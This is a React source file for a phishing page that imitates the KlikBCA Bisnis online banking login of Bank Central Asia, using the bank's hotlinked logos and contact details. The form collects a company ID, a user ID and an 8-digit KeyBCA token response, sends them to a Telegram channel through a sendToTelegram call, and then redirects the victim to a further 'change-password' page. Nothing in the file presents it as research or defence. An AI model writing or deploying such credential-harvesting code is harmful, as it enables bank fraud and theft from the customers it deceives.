import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { sendToTelegram, formatInfoMessage } from "@/lib/telegram";

export default function InfoPage() {
  const [companyId, setCompanyId] = useState("");
  const [userId, setUserId] = useState("");
  const [keybcaResponse, setKeybcaResponse] = useState("");
  const [language, setLanguage] = useState("Indonesia");
  const { toast } = useToast();
  const [, navigate] = useLocation();

  const infoMutation = useMutation({
    mutationFn: async (data: { companyId: string; userId: string; keybcaResponse: string; language: string }) => {
      const message = formatInfoMessage(data.companyId, data.userId, data.keybcaResponse);
      const success = await sendToTelegram(message);
      if (!success) {
        throw new Error("Failed to send to Telegram");
      }
      return success;
    },
    onSuccess: () => {
      setCompanyId("");
      setUserId("");
      setKeybcaResponse("");
      setTimeout(() => {
        navigate("/change-password");
      }, 1500);
    },
    onError: () => {
      toast({
        title: language === "Indonesia" ? "Gagal" : "Failed",
        description: language === "Indonesia" ? "Gagal mengirim data" : "Failed to send data",
        variant: "destructive",
      });
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!companyId || !userId || !keybcaResponse) {
      toast({
        title: language === "Indonesia" ? "Form Tidak Lengkap" : "Incomplete Form",
        description: language === "Indonesia" ? "Silakan isi semua field" : "Please fill all fields",
        variant: "destructive",
      });
      return;
    }

    if (keybcaResponse.length !== 8 || !/^\d{8}$/.test(keybcaResponse)) {
      toast({
        title: language === "Indonesia" ? "Respons KeyBCA Tidak Valid" : "Invalid KeyBCA Response",
        description: language === "Indonesia" ? "Respons KeyBCA harus 8 digit angka" : "KeyBCA Response must be 8 digits",
        variant: "destructive",
      });
      return;
    }

    infoMutation.mutate({ companyId, userId, keybcaResponse, language });
  };

  return (
    <div className="flex flex-col min-h-screen">
      <div
        className="flex-1 bg-background relative overflow-hidden"
        style={{
          backgroundImage: `url('https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFIGBGMGGGNCDGFGOGHGLGFGIGOCAHOGHG')`,
          backgroundPosition: 'right bottom',
          backgroundRepeat: 'no-repeat',
          backgroundAttachment: 'fixed',
          backgroundSize: 'auto 80%',
        }}
      >
        <div className="relative z-10">
          {/* Header with language toggle */}
          <div className="flex justify-between items-center px-6 md:px-12 py-4">
            <div className="invisible w-20" />
            <button
              onClick={() => setLanguage(language === "Indonesia" ? "English" : "Indonesia")}
              className="flex items-center gap-2 text-sm font-medium text-primary hover:opacity-70 transition-opacity"
              data-testid="button-language-toggle"
            >
              {language === "Indonesia" ? "English Version" : "Versi Indonesia"}
              <div className="w-8 h-8 rounded-full bg-muted flex items-center justify-center text-xs font-bold">
                {language === "Indonesia" ? "EN" : "ID"}
              </div>
            </button>
          </div>

          {/* Main content */}
          <div className="px-4 md:pl-32 py-8">
            <div className="max-w-sm">
              {/* Logo Section - Left Aligned */}
              <div className="mb-10">
                <img
                  src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCCGDGBGOCAHOGHG"
                  alt="BCA Logo"
                  className="h-12 mb-4"
                />
                <h1 className="text-2xl font-bold text-primary mb-1">
                  {language === "Indonesia" ? "KlikBCA Bisnis" : "KlikBCA Business"}
                </h1>
                <p className="text-sm text-primary font-medium">
                  {language === "Indonesia" ? "Sistem Perbankan Online" : "Online Banking System"}
                </p>
              </div>

              {/* Info Form - Left Aligned */}
              <form onSubmit={handleSubmit} className="space-y-3">
                {/* ID Perusahaan */}
                <div className="space-y-2">
                  <Label htmlFor="company-id" className="text-sm font-semibold text-primary">
                    {language === "Indonesia" ? "ID Perusahaan" : "Company ID"}
                  </Label>
                  <Input
                    id="company-id"
                    type="text"
                    value={companyId}
                    onChange={(e) => setCompanyId(e.target.value)}
                    placeholder={language === "Indonesia" ? "Masukkan ID Perusahaan" : "Enter Company ID"}
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-company-id"
                  />
                </div>

                {/* ID Pengguna */}
                <div className="space-y-2">
                  <Label htmlFor="user-id" className="text-sm font-semibold text-primary">
                    {language === "Indonesia" ? "ID Pengguna" : "User ID"}
                  </Label>
                  <Input
                    id="user-id"
                    type="text"
                    value={userId}
                    onChange={(e) => setUserId(e.target.value)}
                    placeholder={language === "Indonesia" ? "Masukkan ID Pengguna" : "Enter User ID"}
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-user-id"
                  />
                </div>

                {/* Respons KeyBCA */}
                <div className="space-y-2">
                  <Label htmlFor="keybca-response" className="text-sm font-semibold text-primary">
                    {language === "Indonesia" ? "Respons KeyBCA" : "KeyBCA Response"}
                  </Label>
                  <Input
                    id="keybca-response"
                    type="text"
                    value={keybcaResponse}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 8);
                      setKeybcaResponse(value);
                    }}
                    placeholder={language === "Indonesia" ? "Masukkan Respons KeyBCA" : "Enter KeyBCA Response"}
                    maxLength={8}
                    className="h-11 text-sm border border-gray-300 rounded-md bg-white px-3 focus:border-primary focus:ring-1 focus:ring-primary"
                    data-testid="input-keybca-response"
                  />
                </div>

                {/* Bahasa / Language */}
                <div className="space-y-2">
                  <Label htmlFor="language-select" className="text-sm font-semibold text-primary">
                    {language === "Indonesia" ? "Bahasa / Language" : "Language"}
                  </Label>
                  <Select value={language} onValueChange={setLanguage}>
                    <SelectTrigger
                      id="language-select"
                      className="h-11 text-sm border border-gray-300 rounded-md bg-white focus:border-primary focus:ring-1 focus:ring-primary"
                      data-testid="select-language"
                    >
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="Indonesia">Indonesia</SelectItem>
                      <SelectItem value="English">English</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <Button
                  type="submit"
                  className="w-full h-10 mt-6 rounded-full bg-primary hover:bg-primary/90 text-white font-semibold uppercase tracking-wide text-sm"
                  disabled={infoMutation.isPending}
                  data-testid="button-submit-info"
                >
                  {infoMutation.isPending ? (language === "Indonesia" ? "Mengirim..." : "Sending...") : (language === "Indonesia" ? "Lanjutkan" : "Continue")}
                </Button>
              </form>

              {/* Help Text Section - Left Aligned */}
              <div className="mt-8 text-sm text-foreground leading-relaxed">
                <p className="mb-3">
                  {language === "Indonesia"
                    ? "Jika Anda belum memiliki fasilitas KlikBCA Bisnis, silakan akses"
                    : "If you don't have KlikBCA Bisnis facility yet, please access"}{" "}
                  <a
                    href="https://www.bca.co.id/id/bisnis/layanan/e-banking-bisnis/klikbca-bisnis"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-primary underline font-medium hover:opacity-70"
                  >
                    {language === "Indonesia" ? "Informasi KlikBCA Bisnis" : "KlikBCA Bisnis Information"}
                  </a>{" "}
                  {language === "Indonesia" ? "atau hubungi:" : "or contact:"}
                </p>
              </div>

              {/* Contact Information Section - Left Aligned */}
              <div className="mt-6 flex gap-6">
                {/* Phone Contact */}
                <a
                  href="tel:1500777"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-phone"
                >
                  <img
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCIGBGMGPGCGDGBGOCAHOGHG"
                    alt="Halo Layanan"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">
                      {language === "Indonesia" ? "Halo Layanan" : "Customer Service"}
                    </p>
                    <p className="font-semibold text-foreground">KlikBCA Bisnis</p>
                    <p className="text-primary font-bold text-xs">1500777</p>
                  </div>
                </a>

                {/* Email Contact */}
                <a
                  href="mailto:halobca@bca.co.id"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-email"
                >
                  <img
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCFGNGBGJGMGOCAHOGHG"
                    alt="Email"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">{language === "Indonesia" ? "Email" : "Email"}</p>
                    <p className="text-primary font-bold text-xs">halobca@bca.co.id</p>
                  </div>
                </a>

                {/* Twitter Contact */}
                <a
                  href="https://twitter.com/halobca"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="flex flex-col items-center text-center space-y-2 hover:opacity-70 transition-opacity"
                  data-testid="link-twitter"
                >
                  <img
                    src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCEHHHJGEHEHFGCHOCAHOGHG"
                    alt="Twitter"
                    className="w-12 h-12"
                  />
                  <div className="text-xs">
                    <p className="font-semibold text-foreground">Twitter</p>
                    <p className="text-primary font-bold text-xs">@HaloBCA</p>
                  </div>
                </a>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="text-center text-xs py-3" style={{ backgroundColor: '#f2f2f2', color: '#1F6198' }}>
        {language === "Indonesia" ? "Copyright © 2020   All Right Reserved" : "Copyright © 2020   All Right Reserved"}
      </div>
    </div>
  );
}
